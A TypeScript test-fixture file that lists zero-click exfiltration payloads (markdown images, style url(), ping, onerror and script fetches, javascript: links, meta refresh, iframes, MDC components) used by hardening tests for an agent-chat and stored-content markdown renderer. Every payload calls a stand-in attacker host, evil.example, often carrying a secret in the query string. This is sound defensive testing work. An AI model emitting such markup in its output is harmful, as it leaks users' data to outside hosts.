// Test-only: the zero-click exfil vector list shared by the agent-chat hardening tests
// (app/lib/agent/markdown-harden.test.ts) and the stored-content hardening tests
// (app/lib/markdown/stored-harden.test.ts). Every vector, rendered, must not make the browser
// request anything on the attacker host.

export const EVIL = 'https://evil.example'
const E = EVIL

/** The 79b agent-chat list (raw HTML, MDC, markdown, previewer fences). */
export const AGENT_VECTORS: Record<string, string> = {
  'markdown image': `![a](${E}/p.png?d=secret)`,
  'reference image': `![b][r]\n\n[r]: ${E}/ref.png?d=secret`,
  'protocol-relative image': `![c](//evil.example/pr.png?d=secret)`,
  'data: image': '![d](data:image/png;base64,iVBORw0KGgo=)',
  'raw <img>': `<img src="${E}/html.png?d=secret">`,
  '<style> url()': `<style>p{background:url(${E}/s.png?d=secret)}</style>\n\ntext`,
  '<link rel=stylesheet>': `<link rel="stylesheet" href="${E}/x.css?d=secret">`,
  'inline style=url()': `<div style="background:url(${E}/bg.png?d=secret)">hi</div>`,
  'span style=url(//)': `<span style="background-image:url(//evil.example/b.png)">hi</span>`,
  '<video poster>': `<video poster="${E}/poster.png?d=secret"></video>`,
  '<picture><source srcset>': `<picture><source srcset="${E}/src.png?d=secret"><img src="/api/images/ok/raw"></picture>`,
  '<a ping>': `<a href="https://ok.example" ping="${E}/ping?d=secret">x</a>`,
  'MDC attributes on markdown': `**s**{style="background:url(${E}/mdc.png)" ping="${E}/p"}`,
  'MDC component with style': `::callout{style="background:url(${E}/c.png)"}\nhi\n::`,
  '<svg><image href>': `<svg><image href="${E}/svg.png"></image></svg>`,
  '<iframe>': `<iframe src="${E}/frame"></iframe>`,
  '```html fence (previewer iframe)': '```html\n<img src="' + E + '/fence.png?d=secret">\n```',
  '```HTML fence, uppercase': '```HTML\n<img src="' + E + '/fence2.png?d=secret">\n```',
  '```html fence never closed': '```html\n<img src="' + E + '/open.png?d=secret">',
  '```html fence with a style url': '```html\n<div style="background:url(' + E + '/fs.png)">x</div>\n```',
  '```svg fence': '```svg\n<svg><image href="' + E + '/svgfence.png"/></svg>\n```',
  '```mermaid fence': '```mermaid\ngraph TD; A-->B; click A "' + E + '/m"\n```'
}

/** Extra vectors that matter for stored content (MDC components, handlers, frontmatter, objects). */
export const STORED_VECTORS: Record<string, string> = {
  ...AGENT_VECTORS,
  '<img onerror>': `<img src="x" onerror="fetch('${E}/onerror')">`,
  '<img srcset>': `<img src="/api/images/ok/raw" srcset="${E}/srcset.png 2x">`,
  '<object data>': `<object data="${E}/obj"></object>`,
  '<embed src>': `<embed src="${E}/embed">`,
  '<input type=image>': `<input type="image" src="${E}/input.png">`,
  '<table background>': `<table background="${E}/tbg.png"><tr><td>x</td></tr></table>`,
  '<audio src>': `<audio src="${E}/a.mp3" autoplay></audio>`,
  '<script>': `<script>fetch('${E}/script')</script>`,
  'MDC :icon (iconify fetch)': `:icon{name="i-mdi-${'secret'}"}`,
  'MDC ::card with to + icon': `::card{to="${E}/card" icon="i-mdi-secret" style="background:url(${E}/card.png)"}\nhi\n::`,
  'MDC ::tabs-item with a remote-collection icon': `::tabs\n:::tabs-item{label="A" icon="i-mdi-secret"}\nx\n:::\n::`,
  'MDC ::callout with a remote-collection icon': `::callout{icon="mdi:secret" to="javascript:alert(1)"}\nhi\n::`,
  'MDC arbitrary registered component (::u-button)': `::u-button{to="${E}/btn" icon="i-mdi-secret"}\nclick\n::`,
  'MDC ::field as=iframe': `::field{as="iframe" src="${E}/field" name="n"}\nx\n::`,
  'MDC bound prop': `:img{:src="'${E}/bound.png'"}`,
  'MDC inline img component': `:img{src="${E}/mdcimg.png"}`,
  'frontmatter mdc.components remap': `---\nmdc:\n  components:\n    p: iframe\n---\n\nhello`,
  'javascript: link': `[x](javascript:fetch('${E}/js'))`,
  'traversal on allowed prefix': `![t](/api/images/../../evil.example/x)`,
  'absolute other-origin /api/i': `![o](${E}/api/i/slug)`,
  '<base href>': `<base href="${E}/">\n\n![rel](/api/images/x/raw)`,
  '<meta refresh>': `<meta http-equiv="refresh" content="0;url=${E}/meta">`,
  // UCodeIcon would build `i-vscode-icons-file-type-<ext>` from the filename → Iconify API fetch.
  '```ts [filename] fence (vscode-icons fetch)': '```ts [notes.SECRETVALUE]\nconst x = 1\n```',
  '::code-group fence filenames': '::code-group\n```ts [a.SECRET]\nx\n```\n```js [b.zz]\ny\n```\n::'
}
